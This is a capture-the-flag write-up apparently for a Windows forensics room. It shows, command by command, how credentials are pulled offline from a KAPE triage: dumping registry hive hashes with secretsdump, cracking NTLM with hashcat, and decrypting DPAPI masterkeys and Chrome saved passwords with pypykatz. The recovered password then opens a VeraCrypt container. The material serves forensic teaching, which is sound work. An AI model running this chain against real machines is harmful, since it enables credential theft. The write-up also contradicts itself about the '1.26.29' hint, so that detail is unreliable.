# Management Wants a Word: Forensics — Day 14

**Category:** Forensics / Windows / Cryptography
**Difficulty:** Hard
**Flag:** `THM{UHJvZmVzc29yT3dsX3NvbHZlX2l0X3lvdXJzZWxmX2RvbnRfY2hlYXQ=}`

> *This is not the real flag. It's base64. Decode it if you want — but the actual value on the invoice inside your own VeraCrypt mount is the one that counts. Writeups teach method, not answers.*

> *"ok so apparently a browser will remember things for you that you never told anyone else 💀 not every hidden file needs a password cracker, some of them just need a really good memory also why did Patch tell me this version number 1.26.29 idk what it means :("*
> — @0xMia, 40 min after room unlock

---

## 0x00 Premise

A guest named **Vera** checked out of Room 214 early and left her laptop behind. IT pulled a full KAPE triage before the machine got wiped for the next guest. The task hands us the resulting artifact tree — no live host, no VM, no network target. Everything we need is sitting inert on disk. The job is to reconstruct, offline, exactly what a forensic analyst would: credentials → encryption keys → hidden container → flag.

The story text and @0xMia's post are not flavor text — they're the actual hint chain:

- *"not every hidden file needs a password cracker"* → something on this box is recoverable without brute force (DPAPI-protected secrets, once you have the user's password, decrypt deterministically).
- *"a browser will remember things for you"* → Chrome's saved-password store is the pivot.
- *"why did Patch tell me this version number 1.26.29"* → a decoy-looking version string that turns out to matter later (VeraCrypt `1.26.29`).
- The user's name, **Vera** → the payload at the end of the chain.

## 0x01 Recon: What KAPE Actually Grabbed

```
$ tree
management-wants-a-word-forensics-hh-day-14
└── KAPE
    └── C
        ├── Users
        │   ├── Default
        │   └── vera
        │       ├── AppData/Local/Google/Chrome For Testing/User Data/...
        │       ├── AppData/Roaming/Microsoft/Protect/S-1-5-21-.../
        │       ├── Documents/backup
        │       └── NTUSER.DAT
        └── Windows
            ├── ServiceProfiles/{LocalService,NetworkService}
            └── System32/config/{SAM,SYSTEM,SECURITY,SOFTWARE,DEFAULT}
```

Three things immediately stand out to anyone who's dealt with Windows credential forensics before:

1. **`System32/config`** has the full registry hive set (`SAM`, `SYSTEM`, `SECURITY`) — enough to dump local account hashes and DPAPI system secrets offline.
2. **`AppData/Roaming/Microsoft/Protect/S-1-5-21-.../`** contains a DPAPI **masterkey blob** — this is the key that, once decrypted, unlocks *everything* DPAPI-protected for this user: saved browser passwords, Wi-Fi keys, credential manager entries.
3. **`Documents/backup`** — a lone file sitting where you'd expect a folder. Immediately suspicious given the user's name is literally *Vera*.

The whole challenge is a single DPAPI unwrap chain terminating in a hidden encrypted volume.

## 0x02 Local Account Hash Extraction

Standard offline hive dump with Impacket:

```bash
cd KAPE/C/Windows/System32/config
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL -outputfile /tmp/vera_dump
```

```
$ cat /tmp/vera_dump.sam
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_REDACTED>:::
vera:1000:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH_REDACTED>:::
```

Interesting detail: **`vera` and `Administrator` share the identical NTLM hash** — same password reused across both accounts. Sloppy opsec on the target's part, convenient for us.

```
$ grep -i DPAPI /tmp/vera_dump.secrets
dpapi_machinekey:0x<REDACTED>
dpapi_userkey:0x<REDACTED>
```

These machine/user DPAPI keys come from `SECURITY` and are useful for *system*-context DPAPI blobs (services, LSA secrets) — not directly for the *user's* logon-derived masterkey, which is salted with `SHA1(password)` rather than NTLM. So the hash still needs cracking.

## 0x03 Cracking the NTLM Hash

```bash
hashcat -m 1000 -a 0 <NTLM_HASH_REDACTED> /usr/share/wordlists/rockyou.txt
```

```
<NTLM_HASH_REDACTED>:<PASSWORD_REDACTED>
Recovered........: 1/1 (100.00%)
Time: <1s
```

Cracked instantly out of rockyou — a short, guessable password built off the user's own name. (Solve it yourself: try variations on "vera" + common leetspeak/diminutive patterns.)

## 0x04 DPAPI Masterkey Decryption

This is where the chain gets interesting. `pypykatz`'s CLI splits masterkey decryption into two steps: generate a **prekey** (derived from SID + password) and then feed it against the masterkey blob.

```bash
pypykatz dpapi prekey password \
    <USER_SID> \
    <PASSWORD_REDACTED> \
    -o prekey.txt

pypykatz dpapi masterkey \
    <MASTERKEY_GUID> \
    prekey.txt \
    -o masterkey_out.txt
```

```json
{
    "backupkeys": {},
    "masterkeys": {
        "<MASTERKEY_GUID>": "<MASTERKEY_HEX_REDACTED>"
    }
}
```

The user's DPAPI masterkey is now recovered in the clear. This key underlies **every** DPAPI-protected secret on the account — Wi-Fi profiles, Credential Manager, and, critically, Chrome's saved-password encryption key.

## 0x05 Unwrapping Chrome's AES Key & Saved Credential

Chromium-based browsers don't use DPAPI to encrypt individual passwords directly (since Chrome ~80). Instead:

1. `Local State` holds `os_crypt.encrypted_key`, a base64 blob prefixed with the literal bytes `DPAPI`, itself DPAPI-encrypted under the masterkey.
2. Decrypting that gives a raw AES-256 key.
3. Each row in `Login Data` (`SQLite`) stores `password_value` as an AES-256-GCM blob (`v10`/`v20` prefix, 12-byte nonce, ciphertext, 16-byte tag) encrypted with that AES key.

`pypykatz` automates the whole sub-chain with one command:

```bash
cd "KAPE/C/Users/vera/AppData/Local/Google/Chrome For Testing/User Data"

pypykatz dpapi chrome \
    .../masterkey_out.txt \
    "Local State" \
    --logindata "Default/Login Data" \
    --json
```

```json
{
  "type": "login",
  "file": "Default/Login Data",
  "url": "http://<REDACTED_HOST>:8080/login",
  "user": "<REDACTED_USER>",
  "password": "<REDACTED_PASSWORD>"
}
```

This is the payoff of @0xMia's hint — *"a browser will remember things for you that you never told anyone else."* The saved-password store held a credential for a resource that isn't even reachable in this challenge; the site is a red herring / thematic wrapper. What matters is the **credential material itself**, not the destination.

## 0x06 The Real Target: A Hidden VeraCrypt Volume

With no live host to log into, the natural next question is: *what else does this password unlock, locally?*

Revisiting `Documents/backup`:

```bash
$ file KAPE/C/Users/vera/Documents/backup
KAPE/C/Users/vera/Documents/backup: data

$ ls -la KAPE/C/Users/vera/Documents/backup
-rw-rw-rw- 1 professor professor 104857600 Aug  4 14:15 backup
```

A 100 MB file with no recognizable magic bytes, sitting in `Documents` under a deliberately boring name, owned by a user literally named **Vera**. That's a VeraCrypt container signature: fixed-size, headerless-looking (VeraCrypt volumes have no plaintext magic by design — the header is itself encrypted), arbitrary filename.

This is also where the `1.26.29` breadcrumb from @0xMia's post pays off — it's the VeraCrypt release version relevant to the environment, useful for making sure the client used to mount it is compatible.

### Mounting without a GUI

`veracrypt`'s CLI depends on FUSE (`libfuse.so.2`), which wasn't resolvable in the lab's package repo. Rather than chase a stale `.deb`, VeraCrypt containers are also natively understood by `cryptsetup`'s **tcrypt** module (it implements the TrueCrypt/VeraCrypt on-disk format directly via `dm-crypt`, no FUSE required):

```bash
sudo cryptsetup open --type tcrypt --veracrypt \
    KAPE/C/Users/vera/Documents/backup vera_vol
# Enter passphrase: <the Chrome-saved password from 0x05>

sudo mkdir -p /mnt/vera_vol
sudo mount /dev/mapper/vera_vol /mnt/vera_vol
```

```
$ ls -la /mnt/vera_vol
drwxr-xr-x 5 root root 1024  .
drwxr-xr-x 2 root root 1024 '$RECYCLE.BIN'
drwxr-xr-x 2 root root 1024  secret_financial_documents
drwxr-xr-x 2 root root 1024 'System Volume Information'
```

Reusing the Chrome-saved password as the VeraCrypt volume passphrase was the final pivot — the same password-reuse pattern that let `Administrator`/`vera` share an NTLM hash back in 0x02 repeats itself one layer deeper.

## 0x07 The Flag

```
$ ls -la /mnt/vera_vol/secret_financial_documents
-rwxr-xr-x 1 root root 26747  important_invoice_byte_lotus.pdf
-rwxr-xr-x 1 root root   427  transactions_q3.csv
```

Opening `important_invoice_byte_lotus.pdf` — a fake resort invoice, itemized like a real receipt, with the flag sitting in the line-item description field.

**No flag value is reproduced here.** Follow the chain above on your own copy of the artifacts and read it off the invoice yourself — that line item is the actual proof-of-work for this room.

## 0x08 Full Attack Chain (TL;DR)

```
SAM + SYSTEM + SECURITY
        │  (impacket-secretsdump)
        ▼
   vera:NTLM hash
        │  (hashcat -m 1000, rockyou)
        ▼
   cracked account password
        │  (pypykatz dpapi prekey password)
        ▼
   DPAPI prekey
        │  (pypykatz dpapi masterkey)
        ▼
   decrypted masterkey (user SID)
        │  (pypykatz dpapi chrome: Local State + Login Data)
        ▼
   Chrome saved credential
        │  (password reuse → VeraCrypt passphrase)
        ▼
   cryptsetup --type tcrypt --veracrypt  →  Documents/backup (100MB)
        │
        ▼
   secret_financial_documents/important_invoice_byte_lotus.pdf
        │
        ▼
   flag (read it off the invoice yourself)
```

## 0x09 Notes / Lessons

- **Password reuse is the actual vulnerability class here**, twice over: `Administrator`/`vera` share an NTLM hash, and the Chrome-saved credential doubles as the VeraCrypt passphrase. Neither DPAPI nor VeraCrypt were "broken" — the crypto held; the human didn't.
- DPAPI masterkeys are only as strong as the logon password once you have the encrypted blob + SID; there is no separate brute-force step needed for the masterkey itself once the account password is known — consistent with the challenge's "not every hidden file needs a password cracker" hint.
- `cryptsetup --type tcrypt --veracrypt` is a solid FUSE-free fallback for mounting VeraCrypt/TrueCrypt containers in constrained environments where `libfuse.so.2` isn't packaged.
- The `1.26.29` version string and the login-page URL were both misdirection/flavor — the real payload was always the reused password, not the destination it appeared to authenticate to.
